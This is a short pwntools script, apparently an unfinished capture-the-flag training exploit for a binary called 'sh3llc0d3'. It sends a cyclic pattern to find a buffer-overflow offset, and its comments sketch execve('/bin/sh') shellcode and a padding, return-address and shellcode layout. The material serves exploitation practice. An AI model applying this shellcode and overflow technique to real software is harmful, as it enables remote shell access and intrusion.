from pwn import *

r = process("./sh3llc0d3")

gdb.attach(r)


input("wait")
#r = remote("bin.training.jinblack.it", 2002)

# jmp binsh
# beforethemove:
# mov rax, 0x3b
# pop rdi
# mov rsi, 0
# mov rdx, 0
# syscall
# binsh:
# call beforethemove
# nop
# nop
# nop
# PADDING + ebp + eip + SHELL + PADDING  




shellcode = cyclic(2000)

r.send(shellcode)

r.interactive()

